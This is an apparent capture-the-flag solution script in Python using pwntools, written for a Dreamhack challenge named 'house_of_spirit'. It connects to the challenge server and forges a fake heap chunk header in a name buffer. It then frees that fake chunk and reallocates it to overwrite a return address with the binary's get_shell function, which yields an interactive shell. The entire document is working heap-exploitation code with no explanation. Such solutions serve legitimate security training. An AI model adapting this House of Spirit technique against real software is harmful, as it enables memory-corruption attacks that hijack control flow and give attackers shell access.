from pwn import *

# p = process('./house_of_spirit')
p = remote("host1.dreamhack.games",9751)
e = ELF('./house_of_spirit')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)
    
    
def delete(addr):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Addr: ', str(addr).encode())
    
def end():
    p.sendlineafter(b'> ', b'3')

context.binary = e
context.log_level = 'debug'
    
payload = b'aaaaaaaa'+ p64(0x60)
# pause()
p.sendafter(b'name: ', payload)

name_addr = int(p.recvline()[:14], 16)
print(f'Name address: {hex(name_addr)}')

delete(name_addr + 0x10)

pause()
create(0x50, b'c'*0x28 + p64(e.symbols.get_shell))

end()

p.interactive()